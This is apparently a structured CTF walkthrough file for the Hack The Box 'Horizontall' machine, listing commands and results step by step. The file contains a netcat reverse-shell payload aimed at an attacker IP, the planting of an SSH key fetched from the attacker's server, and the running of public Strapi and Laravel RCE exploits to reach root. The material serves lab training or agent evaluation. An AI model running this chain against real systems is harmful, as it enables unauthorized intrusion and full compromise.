@@ -1,0 +1,167 @@
+{
+    "initial_prompt": "The \"Horizontall\" machine is an easy-rated Capture The Flag (CTF) challenge on the Hack The Box (HTB) platform, featuring a Linux-based system with the target IP address 10.129.149.92. As a CTF player, my objective is to gain initial access by exploiting vulnerabilities in a web application, escalate privileges, and ultimately retrieve the root flag (root.txt). The attacker’s machine IP is 10.10.16.10.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services running on the target machine to find potential entry points.",
+            "command": "nmap -sV -sC -Pn 10.129.149.92",
+            "result": "The `nmap` scan on 10.129.149.92 reveals port 22/tcp (OpenSSH 7.6p1 Ubuntu) and port 80/tcp (nginx 1.14.0 Ubuntu). Port 80 redirects to `http://horizontall.htb`, indicating a web server as the primary attack vector."
+        },
+        {
+            "step_number": 2,
+            "thought": "Resolve the domain `horizontall.htb` to the target IP for proper web access.",
+            "command": "echo \"10.129.149.92 horizontall.htb\" | sudo tee -a /etc/hosts",
+            "result": "The IP-to-domain mapping for `horizontall.htb` is added to `/etc/hosts` on the attacker's machine. Accessing `http://horizontall.htb` now loads a simple webpage."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate subdomains to uncover hidden services or additional attack surfaces. The wordlist `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` is assumed to be present on Kali Linux with seclists installed.",
+            "command": "wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.horizontall.htb\" --sc 200 http://10.129.149.92",
+            "result": "`wfuzz` discovers the subdomain `api-prod.horizontall.htb` by brute-forcing the Host header against the target IP and filtering for HTTP 200 responses. This suggests a secondary web service."
+        },
+        {
+            "step_number": 4,
+            "thought": "Add the discovered subdomain to the hosts file for resolution.",
+            "command": "echo \"10.129.149.92 api-prod.horizontall.htb\" | sudo tee -a /etc/hosts",
+            "result": "The IP-to-domain mapping for `api-prod.horizontall.htb` is added to `/etc/hosts`. The subdomain is now resolvable."
+        },
+        {
+            "step_number": 5,
+            "thought": "Inspect the subdomain’s web content to confirm it's live.",
+            "command": "curl http://api-prod.horizontall.htb",
+            "result": "`curl` fetches the HTML of `http://api-prod.horizontall.htb`, confirming the site is live and displaying a basic page."
+        },
+        {
+            "step_number": 6,
+            "thought": "Analyze the `/admin/` directory on the subdomain to identify the application framework.",
+            "command": "whatweb http://api-prod.horizontall.htb/admin/",
+            "result": "`whatweb` identifies the application at `http://api-prod.horizontall.htb/admin/` as Strapi. An admin login portal is visible. Further investigation (e.g. checking HTTP headers or page source) might reveal the specific version, Strapi 3.0.0-beta.17.4."
+        },
+        {
+            "step_number": 7,
+            "thought": "Search for known Strapi vulnerabilities to exploit, targeting the identified version.",
+            "command": "searchsploit strapi 3.0.0-beta",
+            "result": "`searchsploit` lists exploits for Strapi. A relevant result is 'Strapi < 3.0.0-beta.17.4 - Unauthenticated RCE - CVE-2019-18818 / EDB-ID: 50239', matching the identified version."
+        },
+        {
+            "step_number": 8,
+            "thought": "Download the Strapi RCE exploit script.",
+            "command": "searchsploit -m 50239",
+            "result": "The exploit script `50239.py` for CVE-2019-18818 is copied to the current directory. This script allows unauthenticated admin password reset and RCE."
+        },
+        {
+            "step_number": 9,
+            "thought": "Run the exploit to reset the admin password and gain an RCE command execution interface.",
+            "command": "python3 50239.py http://api-prod.horizontall.htb",
+            "result": "The exploit successfully resets the Strapi admin password (e.g., to `Sup3r-4dm1n-P@ssw0rd`) and provides a prompt (e.g., `[<strapi>]#`) to execute commands on the target server."
+        },
+        {
+            "step_number": 10,
+            "thought": "Prepare a listener on the attacker machine to receive the reverse shell. This should be run in a separate terminal or backgrounded.",
+            "command": "nc -nlvp 1234",
+            "result": "Netcat starts listening on port 1234 on the attacker's machine (10.10.16.10), ready to catch an incoming reverse shell connection."
+        },
+        {
+            "step_number": 11,
+            "thought": "Use the RCE capability from the Strapi exploit (still running from Step 9) to send a reverse shell payload to the listener.",
+            "command": "rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.10 1234 > /tmp/f",
+            "result": "This payload, entered into the Strapi exploit's RCE prompt, creates a reverse shell connection from the target to the attacker's Netcat listener on 10.10.16.10:1234. A shell as the `strapi` user is obtained on the target."
+        },
+        {
+            "step_number": 12,
+            "thought": "Confirm the user context of the obtained reverse shell. This command is run in the reverse shell.",
+            "command": "whoami",
+            "result": "The command output is `strapi`, confirming the shell is running as the `strapi` user on the target machine."
+        },
+        {
+            "step_number": 13,
+            "thought": "Improve the reverse shell usability by spawning a PTY. This command is run in the reverse shell.",
+            "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+            "result": "A pseudo-terminal is spawned using Python, providing a more interactive bash shell (e.g., `strapi@horizontall:~$`)."
+        },
+        {
+            "step_number": 14,
+            "thought": "Look for locally running services that might be exploitable for privilege escalation. This command is run in the reverse shell.",
+            "command": "ss -tulnp",
+            "result": "The output of `ss -tulnp` reveals a service listening on `127.0.0.1:8000` (TCP LISTEN 0 128 127.0.0.1:8000), likely a web application accessible only from the target machine itself."
+        },
+        {
+            "step_number": 15,
+            "thought": "Create an SSH key pair on the attacker machine for secure, passwordless access to the target. Accept default file location and no passphrase.",
+            "command": "ssh-keygen",
+            "result": "An SSH key pair (`id_rsa` and `id_rsa.pub`) is generated in the `~/.ssh/` directory on the attacker's machine."
+        },
+        {
+            "step_number": 16,
+            "thought": "Copy the attacker's public key to a file named `authorized_keys` in the current working directory to prepare it for serving.",
+            "command": "cp ~/.ssh/id_rsa.pub ./authorized_keys",
+            "result": "The attacker's public key `~/.ssh/id_rsa.pub` is copied to `./authorized_keys` in the current directory."
+        },
+        {
+            "step_number": 17,
+            "thought": "Start a simple HTTP server on the attacker machine to allow the target to download the `authorized_keys` file. This runs in the directory containing `authorized_keys`.",
+            "command": "python3 -m http.server 8000",
+            "result": "A Python HTTP server starts on the attacker's machine (10.10.16.10) on port 8000, serving files from the current directory."
+        },
+        {
+            "step_number": 18,
+            "thought": "Ensure the `.ssh` directory exists in the `strapi` user's home directory on the target. This command is run in the reverse shell.",
+            "command": "mkdir -p ~/.ssh",
+            "result": "The `~/.ssh` directory is created in the `strapi` user's home on the target machine if it doesn't already exist."
+        },
+        {
+            "step_number": 19,
+            "thought": "Download the `authorized_keys` file from the attacker's HTTP server to the target machine's `~/.ssh/` directory. This command is run in the reverse shell.",
+            "command": "wget http://10.10.16.10:8000/authorized_keys -O ~/.ssh/authorized_keys",
+            "result": "The `authorized_keys` file (containing the attacker's public SSH key) is downloaded from the attacker's HTTP server to `~/.ssh/authorized_keys` on the target machine."
+        },
+        {
+            "step_number": 20,
+            "thought": "Set appropriate permissions for the `authorized_keys` file on the target to enable SSH key authentication. This command is run in the reverse shell.",
+            "command": "chmod 600 ~/.ssh/authorized_keys",
+            "result": "Permissions for `~/.ssh/authorized_keys` on the target are set to 600 (read/write for owner only), enabling SSH login using the corresponding private key. The HTTP server on the attacker machine (Step 17) can now be stopped (Ctrl+C)."
+        },
+        {
+            "step_number": 21,
+            "thought": "Establish an SSH connection to the target as `strapi` using the private key and forward the internal Laravel port (8000) to the attacker's local machine. This command is run in a new terminal on the attacker machine.",
+            "command": "ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@10.129.149.92",
+            "result": "An SSH session is established to `strapi@10.129.149.92` using the private key. The target's local port 8000 is forwarded to the attacker's local port 8000. This terminal is now dedicated to the SSH tunnel."
+        },
+        {
+            "step_number": 22,
+            "thought": "Confirm that the Laravel application running on the target's port 8000 is now accessible on the attacker's `localhost:8000`. This command is run in a new terminal on the attacker machine.",
+            "command": "curl http://localhost:8000",
+            "result": "`curl` successfully fetches HTML content from `http://localhost:8000`, confirming the Laravel application (version 7.4.18 identified from page source or framework signatures) is accessible via the SSH tunnel."
+        },
+        {
+            "step_number": 23,
+            "thought": "Download the exploit for Laravel CVE-2021-3129.",
+            "command": "git clone https://github.com/nth347/CVE-2021-3129_exploit.git",
+            "result": "The Git repository `https://github.com/nth347/CVE-2021-3129_exploit.git` containing the exploit for CVE-2021-3129 (Laravel RCE) is cloned into a new directory named `CVE-2021-3129_exploit`."
+        },
+        {
+            "step_number": 24,
+            "thought": "Change directory to the cloned exploit repository.",
+            "command": "cd CVE-2021-3129_exploit",
+            "result": "The current working directory is changed to `CVE-2021-3129_exploit`."
+        },
+        {
+            "step_number": 25,
+            "thought": "Ensure the Python exploit script is executable.",
+            "command": "chmod +x exploit.py",
+            "result": "The `exploit.py` script is made executable."
+        },
+        {
+            "step_number": 26,
+            "thought": "Execute the Laravel exploit against the tunneled application to test for RCE and confirm user context.",
+            "command": "./exploit.py http://localhost:8000 Monolog/RCE1 id",
+            "result": "The exploit successfully executes the `id` command on the target via the tunneled Laravel application. The output (e.g., `uid=0(root) gid=0(root) groups=0(root)`) confirms root-level command execution."
+        },
+        {
+            "step_number": 27,
+            "thought": "Use the confirmed RCE vulnerability to read the root flag.",
+            "command": "./exploit.py http://localhost:8000 Monolog/RCE1 \"cat /root/root.txt\"",
+            "result": "The exploit executes `cat /root/root.txt` on the target, and the content of the root flag (e.g., a 32-character hash) is displayed, successfully completing the CTF."
+        }
+    ]
+}
